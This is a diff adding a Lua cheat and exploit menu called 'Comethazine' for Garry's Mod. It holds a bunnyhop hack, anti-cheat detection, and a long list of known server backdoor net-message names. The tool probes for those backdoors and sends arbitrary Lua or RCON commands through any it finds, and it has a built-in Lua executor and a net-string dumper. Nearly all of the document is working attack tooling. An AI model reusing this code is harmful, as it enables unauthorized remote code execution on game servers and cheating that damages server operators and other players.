@@ -1,0 +1,1281 @@
+	surface.PlaySound("HL1/fvox/bell.wav")
+	print("\n\n\n\n\n\n")
+	    MsgC (Color(220, 0, 250), [[
+	 _________                        __  .__                  .__               
+	 \_   ___ \  ____   _____   _____/  |_|  |__ _____  _______|__| ____   ____  
+	 /    \  \/ /  _ \ /     \_/ __ \   __\  |  \\__  \ \___   /  |/    \_/ __ \ 
+	 \     \___(  <_> )  Y Y  \  ___/|  | |   Y  \/ __ \_/    /|  |   |  \  ___/ 
+	  \________/\____/|__|_|__/\_____>__| |___|__(______/______\__|___|__/\_____>
+	]])
+
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(0,255,255),"Hello "..LocalPlayer():Nick(), Color(0,0,0), ",", Color(0,255,255), " Mod Menu Loaded!")
+
+		if file.Exists("snte_source.lua","LUA") then
+		chat.AddText(Color(255, 0, 0), "[", "Comethazine", "] ", Color( 255,0,0 ), "Snte has been found on server!")
+	end
+
+	if hook.GetTable()["SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"] then
+		hook.Remove("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")
+	end	
+
+		local function ch_bunnyhop(ply)
+		if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround()) then
+		ply:RemoveKey(IN_JUMP);
+		if !LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP then
+		if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
+		ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
+		else
+		ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
+		ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
+		end
+		end
+		elseif(ply:KeyDown(IN_JUMP)) then
+		ply:SetForwardMove(10000)
+		end
+	end
+
+		hook.Add("CreateMove", "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS", function(ply)
+		ch_bunnyhop(ply);
+	end);
+
+		 surface.CreateFont( "comethazine", { font = "Arial", extended = false, size = 128, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
+		 surface.CreateFont( "tabButtons", { font = "Astriumtabs2", extended = false, size = 65, weight = 400, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
+		 surface.CreateFont( "button", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
+		 surface.CreateFont( "labels", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = true, } )
+		 surface.CreateFont( "Features", { font = "Arial", extended = false, size = 16, weight = 1000, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
+
+		local Comethazine = {}
+		local cometh = {}
+		local addedNets = {}
+		local removedNets = {}
+		local rainbowGun = false
+		local MenuDelay = false
+		local MenuOpen = false
+		local netStrings = {}
+		local channel = "";
+		Comethazine.panelPosX = 100
+		Comethazine.panelPosY = 100
+
+		-- NetString Checker Function
+		function CheckIfStringExists(str)
+		local status, error = pcall(net.Start, str)
+		return status
+	end
+
+		function cometh.PostLua(str)
+		net.Start(channel)
+		net.WriteString(str)
+		net.WriteBit(1)
+		net.SendToServer()
+	end
+
+		function cometh.PostRcon(str)
+		net.Start(channel)
+		net.WriteString( str )
+		net.WriteBit(false)
+		net.SendToServer()
+
+	end	
+
+		if (_G.QAC or _G.CAC) then
+	        surface.PlaySound("ambient/alarms/klaxon1.wav")
+	        chat.AddText(Color(255, 0, 0), "[", "Comethazine", "] ", Color( 20,150,200 ), "CAC anti-cheat has been found!")
+	end
+
+	function cometh.Notify(msg)
+		chat.AddText(Color(255, 0, 0), "[Comethazine] ", color_white, msg)
+	end
+
+		function Comethazine.CheckIfStringExists(str)
+			local status, error = pcall(net.Start, str)
+			return status
+	end
+		
+		-- Backdoored Strings
+		netStrings.Strings={{NetString="_Atlaschat"},{NetString="_TitleStore"},{NetString="xenoactivation"},{NetString="EXEC_REMOTE_APPS"},{NetString="yohsambresicianatik<3"},{NetString="Sbox_Message"},{NetString="Sbox_gm_attackofnullday_key"},{NetString="The_DankWhy"},{NetString="nw.readstream"},{NetString="AbSoluT"},{NetString="__G____CAC"},{NetString="Weapon_88"},{NetString="mecthack"},{NetString="SetPlayerDeathCount"},{NetString="FAdmin_Notification_Receiver"},{NetString="DarkRP_ReceiveData"},{NetString="fijiconn"},{NetString="LuaCmd"},{NetString="EnigmaProject"},{NetString="z"},{NetString="FPP_RemovePLYCache"},{NetString="fuwa"},{NetString="stardoor"},{NetString="SENDTEST"},{NetString="rcivluz"},{NetString="c"},{NetString="N::B::P"},{NetString="changename"},{NetString="PlayerItemPickUp"},{NetString="echangeinfo"},{NetString="fourhead"},{NetString="music"},{NetString="slua"},{NetString="adm_network"},{NetString="componenttolua"},{NetString="theberettabcd"},{NetString="SparksLeBg"},{NetString="DarkRP_Armors"},{NetString="DarkRP_Gamemodes"},{NetString="fancyscoreboard_leave"},{NetString="PRDW_GET"},{NetString="pwn_http_send"},{NetString="AnatikLeNoob"},{NetString="GVacDoor"},{NetString="JSQuery.Data"},{NetString="Odiumhelper"},{NetString="Astillanhelper"},{NetString="Sandbox_ArmDupe"},{NetString="VoiceModifaction"},{NetString="entityhealt"},{NetString="material"},{NetString="Comethazine"},{NetString="BetStrep"},{NetString="keyss"},{NetString="banId2"},{NetString="Val"},{NetString="models/zombie.mdl"},{NetString="FPSBOOST"},{NetString="PlayerCheck"},{NetString="Sbox_darkrp"},{NetString="insid3"},{NetString="The_Dankwoo"},{NetString="Sbox_itemstore"},{NetString="Ulib_Message"},{NetString="ULogs_Info"},{NetString="ITEM"},{NetString="R8"},{NetString="fix"},{NetString="Fix_Keypads"},{NetString="Remove_Exploiters"},{NetString="noclipcloakaesp_chat_text"},{NetString="_Defqon"},{NetString="_CAC_ReadMemory"},{NetString="nostrip"},{NetString="nocheat"},{NetString="LickMeOut"},{NetString="ULX_QUERY2"},{NetString="ULXQUERY2"},{NetString="https://i.imgur.com/Gf6hLMl.png"},{NetString="MoonMan"},{NetString="Im_SOCool"},{NetString="JSQuery.Data(Post(false))"},{NetString="Sandbox_GayParty"},{NetString="DarkRP_UTF8"},{NetString="oldNetReadData"},{NetString="Gamemode_get"},{NetString="memeDoor"},{NetString="BackDoor"},{NetString="SessionBackdoor"},{NetString="DarkRP_AdminWeapons"},{NetString="cucked"},{NetString="NoNerks"},{NetString="kek"},{NetString="ZimbaBackDoor"},{NetString="something"},{NetString="random"},{NetString="strip0"},{NetString="fellosnake"},{NetString="enablevac"},{NetString="idk"},{NetString="ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ"},{NetString="snte"},{NetString="apg_togglemode"},{NetString="Hi"},{NetString="beedoor"},{NetString="BDST_EngineForceButton"},{NetString="VoteKickNO"},{NetString="REEEEEEEEEEEE"},{NetString="_da_"},{NetString="Nostra"},{NetString="sniffing"},{NetString="keylogger"},{NetString="CakeInstall"},{NetString="Cakeuptade"},{NetString="love"},{NetString="earth"},{NetString="ulibcheck"},{NetString="Nostrip_"},{NetString="teamfrench"},{NetString="ADM"},{NetString="hack"},{NetString="crack"},{NetString="leak"},{NetString="lokisploit"},{NetString="1234"},{NetString="123"},{NetString="enculer"},{NetString="cake"},{NetString="seized"},{NetString="88"},{NetString="88_strings_"},{NetString="nostraall"},{NetString="blogs_update"},{NetString="nolag"},{NetString="loona_"},{NetString="billys_logs"},{NetString="loona"},{NetString="negativedlebest"},{NetString="berettabest"},{NetString="ReadPing"},{NetString="antiexploit"},{NetString="adm_NetString"},{NetString="mathislebg"},{NetString="Bilboard.adverts:Spawn(false)"},{NetString="pjHabrp9EY"},{NetString="?"},{NetString="lag_ping"},{NetString="allowLimitedRCON(user) 0"},{NetString="aze46aez67z67z64dcv4bt"},{NetString="killserver"},{NetString="fuckserver"},{NetString="cvaraccess"},{NetString="rcon"},{NetString="rconadmin"},{NetString="web"},{NetString="jesuslebg"},{NetString="zilnix"},{NetString="ß ?D)?"},{NetString="disablebackdoor"},{NetString="kill"},{NetString="DefqonBackdoor"},{NetString="DarkRP_AllDoorDatas"},{NetString="0101.1"},{NetString="awarn_remove"},{NetString="_Infinity"},{NetString="Infinity"},{NetString="InfinityBackdoor"},{NetString="_Infinity_Meme_"},{NetString="arivia"},{NetString="ULogs_B"},{NetString="_Warns"},{NetString="_cac_"},{NetString="striphelper"},{NetString="_vliss"},{NetString="YYYYTTYXY6Y"},{NetString="?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®"},{NetString="_KekTcf"},{NetString="_blacksmurf"},{NetString="blacksmurfBackdoor"},{NetString="_Raze"},{NetString="m9k_explosionradius"},{NetString="m9k_explosive"},{NetString="m9k_addons"},{NetString="rcivluz"},{NetString="SENDTEST"},{NetString="_clientcvars"},{NetString="_main"},{NetString="stream"},{NetString="waoz"},{NetString="bdsm"},{NetString="ZernaxBackdoor"},{NetString="UKT_MOMOS"},{NetString="anticrash"},{NetString="audisquad_lua"},{NetString="dontforget"},{NetString="noprop"},{NetString="thereaper"},{NetString="0x13"},{NetString="Child"},{NetString="!Cac"},{NetString="azkaw"},{NetString="BOOST_FPS"},{NetString="childexploit"},{NetString="ULX_ANTI_BACKDOOR"},{NetString="FADMIN_ANTICRASH"},{NetString="ULX_QUERY_TEST2"},{NetString="GMOD_NETDBG"},{NetString="netlib_debug"},{NetString="_DarkRP_Reading"},{NetString="lag_ping"},{NetString="||||"},{NetString="SteamApp2313"},{NetString="FPP_RemovePLYCache"},{NetString="fuwa"},{NetString="stardoor"},{NetString="SENDTEST"},{NetString="rcivluz"},{NetString="c"},{NetString="N::B::P"},{NetString="changename"},{NetString="PlayerItemPickUp"},{NetString="echangeinfo"},{NetString="fourhead"},{NetString="music"},{NetString="slua"},{NetString="adm_network"},{NetString="componenttolua"},{NetString="theberettabcd"},{NetString="SparksLeBg"},{NetString="DarkRP_Armors"},{NetString="DarkRP_Gamemodes"},{NetString="fancyscoreboard_leave"},{NetString="PRDW_GET"},{NetString="pwn_http_send"},{NetString="AnatikLeNoob"},{NetString="GVacDoor"},{NetString="Keetaxor"},{NetString="BackdoorPrivate666"},{NetString="YohSambreLeBest"},{NetString="SNTE<ALL"},{NetString="!Çº/;."},{NetString="pwn_http_answer"},{NetString="pwn_wake"},{NetString="verifiopd"},{NetString="AidsTacos"},{NetString="shix"},{NetString="PDA_DRM_REQUEST_CONTENT"},{NetString="xenoreceivetargetdata2"},{NetString="xenoreceivetargetdata1"},{NetString="xenoserverdatafunction"},{NetString="xenoserverfunction"},{NetString="xenoclientdatafunction"},{NetString="xenoclientfunction"},{NetString="xenoactivation"},{NetString="EXEC_REMOTE_APPS"},{NetString="yohsambresicianatik<3"},{NetString="Sbox_Message"},{NetString="Sbox_gm_attackofnullday_key"},{NetString="The_DankWhy"},{NetString="nw.readstream"},{NetString="AbSoluT"},{NetString="__G____CAC"},{NetString="Weapon_88"},{NetString="mecthack"},{NetString="SetPlayerDeathCount"},{NetString="FAdmin_Notification_Receiver"},{NetString="DarkRP_ReceiveData"},{NetString="fijiconn"},{NetString="LuaCmd"},{NetString="EnigmaProject"},{NetString="z"},{NetString="cvardel"},{NetString="json.parse(crashsocket)"},{NetString="effects_en"},{NetString="file"},{NetString="gag"},{NetString="asunalabestwaifu"},{NetString="stoppk"},{NetString="Ulx_Error_88"},{NetString="NoOdium_ReadPing"},{NetString="banId"},{NetString="kickId2"},{NetString="elsakura"}}
+
+		function CheckBackdoors() 
+		for k,v in pairs(netStrings.Strings) do
+		if(CheckIfStringExists(v.NetString)) then
+		channel = v.NetString
+		chat.AddText(Color(255, 0, 0), "[Comethazine]", Color( 20, 150, 20 )," Found Vulnerability: ", Color(20, 150, 200), [[]] ..v.NetString)
+		
+			end
+		end
+	end
+
+		local grad = Material("gui/gradient")
+		local upgrad = Material("gui/gradient_up")
+		local downgrad = Material("gui/gradient_down")
+
+
+	concommand.Add("cm_scan", function()
+		CheckBackdoors()
+		
+	end)
+
+	concommand.Add("net_check", function(ply, cmd, args)
+	    if(!args[1])then return end
+	    local arg1 = args[1]
+	    local arg1 = string.Trim(arg1)
+	    local localPlayer = LocalPlayer():SteamID64()
+	    if(!Comethazine.CheckIfStringExists(arg1)) then MsgC( Color(180, 20, 100), "[Comethazine] ", Color(100, 0, 255), "NetChannel does not exist. \n") return end
+	    Comethazine.PostLua([[player.GetBySteamID64("]] .. localPlayer .. [["):SendLua("MsgC(Color(150, 0, 100), '[Comethazine] ', Color( 150, 0, 150 ), ']]..arg1..[[ ', Color(20, 150, 200), 'is a backdoor!')")]], true, arg1 )
+	end)
+
+		function Comethazine.CheckBackdoors()
+		for k,v in pairs(netStrings.Strings) do
+				if( Comethazine.CheckIfStringExists(v) ) then
+					channel = v
+					chat.AddText( Color( 150, 20, 100), "[Comethazine]", Color( 150, 0, 150 )	," Found NetChannel ▶ ", Color(20, 150, 200), [[]] ..v )
+				end
+			end
+		end
+
+	-- Dev Commands
+	concommand.Add("net_append", function(ply, cmd, args) 
+	if(!args[1]) then return end
+	local arg1 = args[1]
+	local arg1 = string.Trim(arg1)
+	table.insert(netStrings.Strings, arg1)
+	table.insert(addedNets, arg1)
+	end)
+
+	concommand.Add("net_remove", function(ply, cmd, args) 
+	if(!args[1]) then return end
+	local arg1 = args[1]
+	local arg1 = string.Trim(arg1)
+	table.RemoveByValue(netStrings.Strings, arg1)
+	table.insert(removedNets, arg1)
+	end)
+
+	concommand.Add("net_default", function() 
+		for k, v in pairs(addedNets) do 
+			table.RemoveByValue(netStrings.Strings, v)
+			addedNets = {}
+		end	
+		for g, _ in pairs(removedNets) do 
+			table.insert(netStrings.Strings, _)
+			removedNets = {}
+		end	
+	end)
+
+			-- Color Transition
+		local mat_white = Material("vgui/white")
+		function draw.SimpleLinearGradient(x, y, w, h, startColor, endColor, horizontal)
+			draw.LinearGradient(x, y, w, h, { {offset = 0, color = startColor}, {offset = 1, color = endColor} }, horizontal)
+		end
+		function draw.LinearGradient(x, y, w, h, stops, horizontal)
+			if #stops == 0 then
+				return
+			elseif #stops == 1 then
+				surface.SetDrawColor(stops[1].color)
+				surface.DrawRect(x, y, w, h)
+				return
+			end
+			table.SortByMember(stops, "offset", true)
+			render.SetMaterial(mat_white)
+			mesh.Begin(MATERIAL_QUADS, #stops - 1)
+			for i = 1, #stops - 1 do
+				local offset1 = math.Clamp(stops[i].offset, 0, 1)
+				local offset2 = math.Clamp(stops[i + 1].offset, 0, 1)
+				if offset1 == offset2 then continue end
+				local deltaX1, deltaY1, deltaX2, deltaY2
+				local color1 = stops[i].color
+				local color2 = stops[i + 1].color
+				local r1, g1, b1, a1 = color1.r, color1.g, color1.b, color1.a
+				local r2, g2, b2, a2
+				local r3, g3, b3, a3 = color2.r, color2.g, color2.b, color2.a
+				local r4, g4, b4, a4
+				if horizontal then
+					r2, g2, b2, a2 = r3, g3, b3, a3
+					r4, g4, b4, a4 = r1, g1, b1, a1
+					deltaX1 = offset1 * w
+					deltaY1 = 0
+					deltaX2 = offset2 * w
+					deltaY2 = h
+				else
+					r2, g2, b2, a2 = r1, g1, b1, a1
+					r4, g4, b4, a4 = r3, g3, b3, a3
+					deltaX1 = 0
+					deltaY1 = offset1 * h
+					deltaX2 = w
+					deltaY2 = offset2 * h
+				end
+				mesh.Color(r1, g1, b1, a1)
+				mesh.Position(Vector(x + deltaX1, y + deltaY1))
+				mesh.AdvanceVertex()
+				mesh.Color(r2, g2, b2, a2)
+				mesh.Position(Vector(x + deltaX2, y + deltaY1))
+				mesh.AdvanceVertex()
+				mesh.Color(r3, g3, b3, a3)
+				mesh.Position(Vector(x + deltaX2, y + deltaY2))
+				mesh.AdvanceVertex()
+				mesh.Color(r4, g4, b4, a4)
+				mesh.Position(Vector(x + deltaX1, y + deltaY2))
+				mesh.AdvanceVertex()
+			end
+			mesh.End()
+		end
+
+		function draw.OutlinedBox( x, y, w, h, thickness, clr )
+			surface.SetDrawColor( clr )
+			for i=0, thickness - 1 do
+				surface.DrawOutlinedRect( x + i, y + i, w - i * 2, h - i * 2 )
+			end
+		end
+		 
+		function Comethazine.labelOutline(name, pos, size)
+			draw.OutlinedBox( pos[1], pos[2], size[1] , size[2], 2, Color( 0, 0, 0 ) )
+			draw.OutlinedBox( pos[1] + 1, pos[2] + 1, size[1] -2 , size[2] -2, 1, Color( 50, 50, 50 ) )
+			draw.WordBox( 8, pos[1] + 20 , pos[2] - 15, name, "labels", Color(30, 30, 30), Color(255, 255, 255) )
+		end
+
+		function Comethazine.load()
+			hook.Add("Think", "openMenu", function()
+			if (input.IsKeyDown(KEY_INSERT) && !MenuDelay) then
+					MenuDelay = true
+					Comethazine.Comethazine()
+					timer.Simple( 0.5, function() MenuDelay = false end )
+				end
+			end)
+		end
+
+		function Comethazine.Comethazine()
+				if MenuOpen then
+				CloseMenu()
+				return
+			end
+		MenuOpen = true
+
+			local comethazine = vgui.Create("DFrame")
+			surface.PlaySound("buttons/button3.wav")	
+			comethazine:ShowCloseButton( false )
+			comethazine:MakePopup()
+			comethazine:SetSize(820, 700)
+			comethazine:SetPos(Comethazine.panelPosX, Comethazine.panelPosY)
+			comethazine:SetTitle(" ")
+			comethazine:SetVisible(true)
+			comethazine:SetDraggable(true)
+			comethazine:Show()
+			comethazine.Paint = function( self, w, h)
+			draw.RoundedBox( 2 , 0 , 0 , 920 , 700 , Color(17,17,17))
+			draw.RoundedBox( 2, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
+			draw.RoundedBox( 2, 0, 0, self:GetWide(), self:GetTall(), Color( 30,30,30 ) )
+			surface.SetDrawColor(20, 20, 20)
+			surface.DrawRect(8, 9, 101, 683)
+			draw.OutlinedBox( 3, 3, w - 6 , h - 6, 5, Color( 50, 50, 50 ) )
+			draw.OutlinedBox( 4.8, 4.8, w - 8 , h - 8, 3, Color( 42, 42, 42 ))
+		end
+
+		function draw.Essential(position,parent)
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(110, 9, 1, 683)
+			surface.SetDrawColor(0, 0, 0)
+			surface.DrawRect(109, 9, 1, 683)
+			surface.SetDrawColor(0,0,0)
+			surface.DrawRect(8,position,101,106)
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(8,position + 1,102,104)
+			surface.SetDrawColor(30,30,30)
+			surface.DrawRect(8,position + 2,103,102)
+			surface.DrawRect(8, 9, 803, 4)
+			draw.LinearGradient(comethazine.x + 10, comethazine.y + 10, parent:GetWide() - 11, 2, { {offset = 0, color = Color(59, 175, 222)}, {offset = 0.5, color = Color(202, 70, 205)}, {offset = 1, color = Color(201, 227, 58)} }, true)
+			draw.SimpleTextOutlined( "C", "tabButtons", 63, 95, color_white, 1, 1, 1, color_black )
+			draw.SimpleTextOutlined( "D", "tabButtons", 58, 200, color_white, 1, 1, 1, color_black )
+			draw.SimpleTextOutlined( "E", "tabButtons", 58, 295, color_white, 1, 1, 1, color_black )
+			draw.SimpleTextOutlined( "H", "tabButtons", 58, 395, color_white, 1, 1, 1, color_black )
+			draw.SimpleTextOutlined( "G", "tabButtons", 58, 495, color_white, 1, 1, 1, color_black )
+			draw.SimpleTextOutlined( "F", "tabButtons", 58, 595, color_white, 1, 1, 1, color_black )
+		end
+
+		local panelNames = {"Backdoors", "Exploits", "panel3", "panel4", "panel5", "panel6"}
+		panelTable = {}
+
+		for k,v in pairs(panelNames) do
+			comethazinePanel = vgui.Create( "DPanel" )
+				if(panelTable[1]) then comethazinePanel:SetVisible(false) end
+				comethazinePanel:SetParent(comethazine)
+				comethazinePanel:SetPos( 0, 0 ) 
+				comethazinePanel:SetSize( 811, 791 )
+		table.insert(panelTable, comethazinePanel)
+		end
+
+		panelTable[1].Paint = function (self, w, h) draw.Essential(48 + (100 * 1 - 100), self)
+			Comethazine.labelOutline("Aimbot", {144, 39}, {302, 622})
+			Comethazine.labelOutline("Other", {479, 39}, {302 , 312})
+			Comethazine.labelOutline("Anti-Aimbot", {479, 389}, {302 , 272})
+		end
+		panelTable[2].Paint = function (self, w, h) draw.Essential(48 + (100 * 2 - 100), self)
+			Comethazine.labelOutline("Triggerbot", {144, 39}, {302, 622})
+			Comethazine.labelOutline("Settings", {479, 39}, {302 , 312})
+		end
+		panelTable[3].Paint = function (self, w, h) draw.Essential(48 + (100 * 3 - 100), self)
+
+		end
+		panelTable[4].Paint = function (self, w, h) draw.Essential(48 + (100 * 4 - 100), self)
+			Comethazine.labelOutline("Utilities", {144, 39}, {302, 622})
+			Comethazine.labelOutline("Player List", {479, 39}, {302 , 312})
+			Comethazine.labelOutline("Player Functions", {479, 389}, {302 , 272})
+		end
+		panelTable[5].Paint = function (self, w, h) draw.Essential(48 + (100 * 5 - 100), self)
+			Comethazine.labelOutline("Backdoors", {144, 39}, {302, 622})
+			Comethazine.labelOutline("Extras", {479, 39}, {302 , 312})
+			Comethazine.labelOutline("Miscellaneous", {479, 389}, {302 , 272})
+		end
+		panelTable[6].Paint = function (self, w, h) draw.Essential(48 + (100 * 6 - 100), self)
+			Comethazine.labelOutline("Target .Net", {144, 39}, {637, 79})
+			Comethazine.labelOutline("Lua Executor", {144, 163}, {637, 400})
+		end
+		
+		
+			-- Aimbot 1
+		
+			-- backdoors tab 5/6
+		
+		local netchanger = vgui.Create("DTextEntry", panelTable[6])
+			netchanger:SetPos(153, 50)
+			netchanger:SetSize(620, 60)
+			netchanger:SetTextColor(Color(255, 255, 255, 255))
+			netchanger.Paint = function(self, w, h)
+			surface.SetDrawColor(30, 30, 30)
+			surface.DrawRect(0, 0, w , h  )
+			surface.SetDrawColor(30, 30, 30)
+			surface.DrawRect(1, 1, w  -2 , h -2  )
+			surface.SetDrawColor(30, 30, 30)
+			surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+			self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+
+		end
+		
+		netchanger.OnEnter = function(self)
+		surface.PlaySound("buttons/button18.wav")
+			cometh.Notify("Targeting: '" .. netchanger:GetValue() .. "'")
+			channel = self:GetValue()
+		end
+		
+		
+	local executorcode = vgui.Create("DTextEntry", panelTable[6])
+			executorcode:SetPos(149, 169)
+			executorcode:SetSize(617, 380)
+			executorcode:SetMultiline(true)
+			executorcode:SetTextColor(Color(255, 255, 255, 255))
+			executorcode.Paint = function(self, w, h)
+				surface.SetDrawColor(30, 30, 30)
+				surface.DrawRect(0, 0, w , h  )
+				surface.SetDrawColor(30, 30, 30)
+				surface.DrawRect(1, 1, w  -2 , h -2  )
+				surface.SetDrawColor(30, 30, 30)
+				surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+				self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+
+	end
+		
+	executorcode.OnEnter = function(self)
+		chat.AddText(self:GetValue())
+	end	
+		
+	local runcode = vgui.Create("DButton", panelTable[6])
+		runcode:SetSize( 637, 45 )
+		runcode:SetPos( 144, 577 )
+		runcode:SetFont("Features")
+		runcode:SetText("Execute Code")
+		runcode:SetTextColor(Color(255, 255, 255, 255))
+		runcode.Paint = function(self, w, h)
+			surface.SetDrawColor(0, 0, 0)
+			surface.DrawRect(0, 0, w , h  )
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(1, 1, w  -2 , h -2  )
+			surface.SetMaterial(Material("gui/gradient_up"))
+			surface.SetDrawColor(35, 35, 35)
+			surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+
+	end
+
+		runcode.DoClick = function()
+		surface.PlaySound("buttons/button18.wav")
+		RunString(executorcode:GetText())
+
+	end
+		
+	local bdscanner = vgui.Create("DButton", panelTable[6])
+		bdscanner:SetSize( 315, 45 )
+		bdscanner:SetPos( 144, 633 )
+		bdscanner:SetFont("Features")
+		bdscanner:SetText("Backdoor Scan")
+		bdscanner:SetTextColor(Color(255, 255, 255, 255))
+		bdscanner.Paint = function(self, w, h)
+			surface.SetDrawColor(0, 0, 0)
+			surface.DrawRect(0, 0, w , h  )
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(1, 1, w  -2 , h -2  )
+			surface.SetMaterial(Material("gui/gradient_up"))
+			surface.SetDrawColor(35, 35, 35)
+			surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+
+	end	
+		
+		bdscanner.DoClick = function()
+		surface.PlaySound("buttons/button18.wav")
+			CheckBackdoors()
+		end
+		
+		
+	local netscanner = vgui.Create("DButton", panelTable[6])
+		netscanner:SetSize( 315, 45 )
+		netscanner:SetPos( 466, 633 )
+		netscanner:SetFont("Features")
+		netscanner:SetText("NetString Scan")
+		netscanner:SetTextColor(Color(255, 255, 255, 255))
+		netscanner.Paint = function(self, w, h)
+			surface.SetDrawColor(0, 0, 0)
+			surface.DrawRect(0, 0, w , h  )
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(1, 1, w  -2 , h -2  )
+			surface.SetMaterial(Material("gui/gradient_up"))
+			surface.SetDrawColor(35, 35, 35)
+			surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+
+			-- ConCommands
+		local CY = CY or {}
+		concommand.Add("dumpnet", function()
+		local netstrings = {}
+		for i = 1, 9999 do
+			local s = util.NetworkIDToString( i )
+			if s then MsgC( Color(180, 20, 100), "[NETDump] ", Color(100, 0, 255), "NetChannel "..i.." = ", Color(20, 150, 200),''..s.."\n") else break end
+		end
+		end)
+
+	end	
+		
+		netscanner.DoClick = function()
+		surface.PlaySound("buttons/button18.wav")
+		local netstrings = {}
+		for i = 1, 9999 do
+			local s = util.NetworkIDToString( i )
+			if s then MsgC( Color(180, 20, 100), "[NETDump] ", Color(100, 0, 255), "NetChannel "..i.." = ", Color(20, 150, 200),''..s.."\n") else break end
+		end
+		end	
+
+
+		function Comethazine.emptyButton( parent, pos, size, func )
+			local emptyButton = parent:Add( "DButton" )
+			emptyButton:SetText( "" )
+			emptyButton:SetPos(pos[1], pos[2])
+			emptyButton:SetSize(size[1], size[2])
+			emptyButton.DoClick = func
+			emptyButton.Paint = function( self, w, h )
+			surface.SetDrawColor(255,255,255)
+			end
+		end
+
+		function Comethazine.createTabButtons(amount)
+		for i = 1, amount do
+			Comethazine.emptyButton( comethazine, {8, 48 + (100 * i - 100)}, {101, 106}, function() panelTable[i]:SetVisible(true) for k ,v in pairs(panelTable) do if(k != i) then panelTable[k]:SetVisible(false) end end end)
+			end
+		end
+		Comethazine.createTabButtons(6)
+
+		function Comethazine.PostLua( str )
+		if (channel == "") then chat.AddText( Color( 255, 0, 0), "[Comethazine]", Color( 0, 100, 255 )	," You are not targeting a .net") return end
+			net.Start(channel)
+			net.WriteString( str )
+			net.WriteBit(1)
+			net.SendToServer()
+		end
+
+		function Comethazine.PostRcon( str )
+			net.Start(channel)
+			net.WriteString( str )
+			net.WriteBit(false)
+			net.SendToServer()
+		end
+
+		function Comethazine.AddButton( name, parent, func )
+		local button = parent:Add( "DButton" )
+		button:SetText( "" )
+		button:Dock( TOP )
+		button:DockMargin( 0, 0, 0, 8 )
+		button:SetSize(15, 30)
+		button.DoClick = func
+		button.Paint = function( self, w, h )
+			surface.SetDrawColor(0, 0, 0)
+			surface.DrawRect(0, 0, w , h  )
+			surface.SetDrawColor(50, 50, 50)
+			surface.DrawRect(1, 1, w  -2 , h -2  )
+			surface.SetMaterial(Material("gui/gradient_up"))
+			surface.SetDrawColor(35, 35, 35)
+			surface.DrawTexturedRect(2, 2, w -4 , h - 4 )
+			draw.SimpleTextOutlined( name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black )
+			end
+		end
+		
+			-- Feature Lists
+		local withinput = vgui.Create( "DPanelList", panelTable[5] )
+		withinput:SetPos( 195, 85 )
+		withinput:SetSize( 200, 530 )
+		withinput:SetPadding( 5 )
+		withinput:SetSpacing( 5 )
+		withinput:EnableHorizontal( false )
+		withinput:EnableVerticalScrollbar( true )
+		withinput:SetName( "" )
+
+		local withoutinput = vgui.Create( "DPanelList", panelTable[5] )
+		withoutinput:SetPos( 530, 85 )
+		withoutinput:SetSize( 200, 227 )
+		withoutinput:SetPadding( 5 )
+		withoutinput:SetSpacing( 5 )
+		withoutinput:EnableHorizontal( false )
+		withoutinput:EnableVerticalScrollbar( true )
+		withoutinput:SetName( "" )
+
+		local harmful = vgui.Create( "DPanelList", panelTable[5] )
+		harmful:SetPos( 530, 435 )
+		harmful:SetSize( 200, 430 )
+		harmful:SetPadding( 5 )
+		harmful:SetSpacing( 5 )
+		harmful:EnableHorizontal( false )
+		harmful:EnableVerticalScrollbar( true )
+		harmful:SetName( "" )
+
+			-- Scroll Bars
+		local bar1 = vgui.Create("DScrollPanel", withinput)
+		bar1:Dock(FILL)
+		
+		local sbar1 = bar1:GetVBar()
+		function sbar1:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+		function sbar1.btnUp:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
+		function sbar1.btnDown:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
